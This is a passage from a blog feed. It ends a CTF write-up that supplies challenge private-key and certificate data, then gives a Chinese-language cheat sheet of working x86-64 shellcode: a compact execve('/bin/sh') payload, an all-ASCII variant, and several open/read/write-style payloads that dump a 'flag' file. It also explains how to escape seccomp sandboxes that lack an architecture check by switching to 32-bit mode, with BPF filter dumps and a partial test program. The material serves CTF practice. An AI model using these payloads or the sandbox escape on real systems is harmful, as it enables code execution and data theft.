class="hljs shell">In this challenge you will work with public key certificates.<br>You will be provided with a self-signed root certificate.<br>You will also be provided with the root private key, and must use that to sign a user certificate.<br><br><br>root key d: 0x375eb69bcd972b471de0cfa0de19042475f267a252b5348a4733d3d3c4b0f1912c88a7bca3974a900bd7fb52bfbbb263f1cc68bf9efe5d32376dbf0577627ec078c086c7969601571c7e2f6d56f6af3b3a595e414e8628dc93aa739303c0bb17a50c8d6d488b14661454815a42c42e47d55044fe85a5e4185bb7cd4b892cbf61f0cf704e812bbf96cf86dc8e87d6f7f1884a7941e08b72869b09c88634242bbdadf767086c8e5157276c8ddcb1de9bdb3e3fe319fb5c94e9888b0679451978d1052560b120e3af96790da08c5bd0b4a641a442b0cee2de459dd763d2d09d4a14f586fdbf7dcce27a66474620da6e3bc37b0e5b03c4054b52634945118a9c601<br>root certificate (b64): eyJuYW1lIjogInJvb3QiLCAia2V5IjogeyJlIjogNjU1MzcsICJuIjogMjI1MzQ5OTA0NTk4MjI5ODEzNTk5NjE3Mjk5MjEyODY1MzA0MDcxODY3NzU2MjgyNDk1NTIxOTg1MjM3NTczNjgwOTAyMDcwMzMxMTIyOTQ2MzgxNDAyNTEyNzIwMTgwNTk4MzI1ODk3OTA0NjgxMDM2Mzc4Njg4MDY4NzAzMDU0OTY0NzQwODg0NDA2ODQxNTk0MjU4NDE4MjcxNDA1MDAwMTQxMjYzOTg4NDgyMjcyOTk5MTE4MTUxNTc5NTYyODY2MDM3MDczNzAxNTIwMDc0Njg4MDIzNDA3NjA0MTA1NDAwNDQ4MTM4NTI2NjM4NzY0MTAxNTk0OTc4NDg0MTg5NjMxMjk3MTA0MTY4NzQ5MzEyNjk5OTIyNjgyODA2ODg3Mjc0NTk1MzkwNzIxOTUyMzc5NDM1Mzk2NDgzMjc3MTc4MTkzNzEyNDQ0NDE4MjU3MDIwNDU1MTU0NjU3MDg1MTE0NDA4NTc0MDk5NTAxMzI2MDYxMjg2MzA1MzU4ODI5NDAzMTM5NDQ1ODU0NTE3NDk4ODUyNjUyNTY1NDIzNTA3OTgxNjI3NjE3OTk2MDEyNTE4OTY0NTMxNzY3OTMyNDkwODg5NDQ3NDQ5Mjg0Mzc1ODQzNTQzMjA1MTIxNTA2MjExNDkyODQ0NTI3NTQzNjkwMDE0NTM1NzgxMTk4ODY2NTAyODQ4Njk0ODM5MzU0NDQ0NzMxNTYxODE5OTc4Mjg0MjE1NTIyMjAwMjY4NTM4NzYwNjM0NDY4MDY3NzY1NDY2NTU1MTkyMDYxNDgwODE5MTEzMTkwMTU3MjMyODIzNTA4OTl9LCAic2lnbmVyIjogInJvb3QifQ==<br>root certificate signature (b64): hwsElNfFo99DurQ2y8BlPfwPf3kVk6EPNjQntqm1avvysj4/2nLvzISC0NilKnV7K9H8X56w/GpkR6lHTodnZn7veHL5IyP3Bt9Q7jkw5NYQVtZt1z41klY2S2xd4j4YcGcP8M5VNJQQHqFBLXvIIQIRBdKt3HRw0GfSQZhPGgYJ1rUdPY/UDRRNTlaSW9gNZVJm2qJ4jW+I0/WC3YkVg3eNOgaljU6pdvbfl5T0cyHuvD22fgECSaZYxhtOfZX6TS/SOCXf8FVIuMbA202xsgtaVbfjgIbubAXQjZPT09Il8+t4f9D8N/6yx9Iq9/nGuBqCmexqqmy8McEnzfBaSg==<br>user certificate (b64):<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h4 id="level14-2"><a href="#level14-2" class="headerlink" title="level14"></a>level14</h4><blockquote><p>Perform a simplified TLS handshake as the server, completing a Diffie-Hellman key exchange and establishing an encrypted channel to provide a user certificate and prove private key ownership</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode</title>
      <link href="/2024/08/30/shellcode/"/>
      <url>/2024/08/30/shellcode/</url>
      
        <content type="html"><![CDATA[<p>shellcode</p><span id="more"></span><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>关于系统调用号：<a href="/pwn/syscall">syscall</a></p><p>下面给出了收集到的shellcode，将部分可能需要修改的shellcode反编译出来了，一些有特殊限制的就没有给出反编译结果</p><h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><h3 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h3><blockquote><p>一般没有禁用execve就会用execve来拿shell，如果禁了(KILL)就不要想着拿shell了，因为你拿到的shell输入的命令也要用execve，同样会被禁</p></blockquote><h4 id="scanf可读取-22字节"><a href="#scanf可读取-22字节" class="headerlink" title="scanf可读取 22字节"></a>scanf可读取 22字节</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">xor</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsi</span><br><span class="hljs-keyword">push</span>   <span class="hljs-built_in">rsi</span><br>movabs <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0x68732f2f6e69622f</span><br><span class="hljs-keyword">push</span>   <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">push</span>   <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">al</span>, <span class="hljs-number">0x3b</span><br><span class="hljs-keyword">cdq</span>    <br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="纯ascii字符"><a href="#纯ascii字符" class="headerlink" title="纯ascii字符"></a>纯ascii字符</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span><br></code></pre></td></tr></table></figure><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><h4 id="open-read-wirte"><a href="#open-read-wirte" class="headerlink" title="open read wirte"></a>open read wirte</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;hflagH\x89\xe71\xf6j\x02X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span>   <span class="hljs-number">0x67616c66</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">xor</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-built_in">esi</span><br><span class="hljs-keyword">push</span>   <span class="hljs-number">0x2</span><br><span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">syscall</span> <br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>, <span class="hljs-number">0x100</span><br><span class="hljs-keyword">xor</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-keyword">syscall</span> <br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>, <span class="hljs-number">0x1</span><br><span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">push</span>   <span class="hljs-number">0x1</span><br><span class="hljs-keyword">pop</span>    <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="openat-sendfile"><a href="#openat-sendfile" class="headerlink" title="openat sendfile"></a>openat sendfile</h4><blockquote><p>open系统调用实际上是调用了openat，如果open被禁了就直接用openat吧;同时sendfile还可以同时进行读写，真不错</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H1\xffH\xff\xc7H\x89\xc6H1\xd2I\xc7\xc2\x00\x01\x00\x00H\xc7\xc0(\x00\x00\x00\x0f\x05&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x0067616c662f</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">257</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>,<span class="hljs-number">0x100</span> # 读取文件的长度,不够就加<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">40</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="openat-readv-writev"><a href="#openat-readv-writev" class="headerlink" title="openat readv writev"></a>openat readv writev</h4><blockquote><p>也可以用，将sendfile变成了读写两个系统调用，同时利用栈作为缓冲区</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;H\xb8/flag\x00\x00\x00PH\x89\xe6H1\xd2H\xc7\xc0\x01\x01\x00\x00\x0f\x05H\x89\xc7h\x00\x01\x00\x00H\x89\xe3H\x81\xeb\x08\x01\x00\x00SH\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x13\x00\x00\x00\x0f\x05H\xc7\xc7\x01\x00\x00\x00H\x89\xe6H\xc7\xc2\x01\x00\x00\x00H\xc7\xc0\x14\x00\x00\x00\x0f\x05&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">0x0067616c662f</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">257</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0x100</span> # 读入大小由这个控制<br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">rbx</span>,<span class="hljs-number">0x108</span> # 为读入大小加<span class="hljs-number">8</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rbx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">19</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>,<span class="hljs-number">20</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="openat2-read-write"><a href="#openat2-read-write" class="headerlink" title="openat2 read write"></a>openat2 read write</h4><blockquote><p>open,openat都被禁了，用openat2，但要注意openat2系统调用是在kernel5.6版本引入的，因此ubuntu20.04及以下的版本是不支持该系统调用的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&#x27;H\xc7\xc0flagPH1\xffH\x83\xefdH\x89\xe6j\x00j\x00j\x00H\x89\xe2I\xc7\xc2\x18\x00\x00\x00h\xb5\x01\x00\x00X\x0f\x05H\x89\xc7H\x89\xe6\xba\x00\x01\x00\x001\xc0\x0f\x05\xbf\x01\x00\x00\x00H\x89\xe6j\x01X\x0f\x05&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x67616c66</span> # 路径<br><span class="hljs-keyword">push</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span><br><span class="hljs-keyword">sub</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">100</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-number">0x18</span><br><span class="hljs-keyword">push</span> SYS_openat2 # pwntools预定义的系统调用号,也可以手动查<br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x100</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br><span class="hljs-keyword">syscall</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">edi</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rsp</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">rax</span><br><span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h4 id="mmap-fstat-read-write"><a href="#mmap-fstat-read-write" class="headerlink" title="mmap fstat read write"></a>mmap fstat read write</h4><blockquote><p>有时候程序会禁用open,openat,openat2这三个打开文件的方法，但是没有禁用fstat系统调用，该系统调用号在32位的环境下为open系统调用，于是我们就可以通过retfq指令将程序转到32位环境下运行，利用32位的open系统调用打开flag文件</p></blockquote><p>注意，如果是以下含有arch检测的沙箱无法通过这种方式绕过，一般通过seccomp_rule_add生成的就是这种</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">A</span> = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x09 <span class="hljs-number">0</span>xc000003e  if (<span class="hljs-keyword">A</span> != ARCH_X86_64) goto <span class="hljs-number">0011</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35 0x00</span> <span class="hljs-number">0</span>x01 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &lt; <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>xffffffff  if (<span class="hljs-keyword">A</span> != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0011</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15 0x04</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  if (<span class="hljs-keyword">A</span> == read) goto <span class="hljs-number">0010</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15 0x03</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000001</span>  if (<span class="hljs-keyword">A</span> == write) goto <span class="hljs-number">0010</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15 0x02</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000005</span>  if (<span class="hljs-keyword">A</span> == fstat) goto <span class="hljs-number">0010</span><br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000009</span>  if (<span class="hljs-keyword">A</span> == mmap) goto <span class="hljs-number">0010</span><br> <span class="hljs-number">0009</span>: <span class="hljs-number">0x15 0x00</span> <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x<span class="hljs-number">000000e7</span>  if (<span class="hljs-keyword">A</span> != exit_group) goto <span class="hljs-number">0011</span><br> <span class="hljs-number">0010</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure><p>下面这种没有对arch的检测，可以绕过</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15 0x05</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000005</span>  if (<span class="hljs-keyword">A</span> == fstat) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x15 0x04</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  if (<span class="hljs-keyword">A</span> == read) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15 0x03</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000001</span>  if (<span class="hljs-keyword">A</span> == write) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15 0x02</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000009</span>  if (<span class="hljs-keyword">A</span> == mmap) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x<span class="hljs-number">000000e7</span>  if (<span class="hljs-keyword">A</span> == exit_group) goto <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br></code></pre></td></tr></table></figure><p>下面是用于测试的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc ./pwn.c -o pwn</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/filter.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// 这种加seccomp的方式无法通过切换为32位进行绕过，因为还会检测架构</span><br>    <span class="hljs-comment">// scmp_filter_ctx ctx;</span><br>    <span class="hljs-comment">// ctx = seccomp_init(SCMP_ACT_KILL);</span><br>    <span class="hljs-comment">// seccomp_arch_add(ctx,SCMP_ARCH_X86); // 加了这一行也没用，只会允许32位的fstat系统调用，而不是系统调用号为5的open</span><br>    <span class="hljs-comment">// seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(fstat),0);</span><br>    <span class="hljs-comment">// seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(read),0);</span><br>    <span class="hljs-comment">// seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(write),0);</span><br>    <span class="hljs-comment">// seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(mmap),0);</span><br>    <span class="hljs-comment">// seccomp_rule_add(ctx,SCMP_ACT_ALLOW,SCMP_SYS(exit_group),0);</span><br>    <span class="hljs-comment">// seccomp_load(ctx);</span><br><br>    <span class="hljs-comment">// 如果采用手写BPF过滤规则，并利用prctl设置seccomp的方式，就有可能漏掉对arch的检测，因此可以绕过</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[]=</span>&#123;<br>        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(fstat), <span class="hljs-number">5</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(read), <span class="hljs-number">4</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(write), <span class="hljs-number">3</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(mmap), <span class="hljs-number">2</span>, <span class="hljs-number">0</span>),<br>        BPF_JUMP(BPF_JMP|BPF_JEQ,SCMP_SYS(exit_group), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>),<br>        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),<br>        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW)<br>    &#125;;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span>=</span>&#123;<br>        .len=<span class="hljs-keyword">sizeof</span>(filter)/<span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),<br>        .filter=filter,<br>    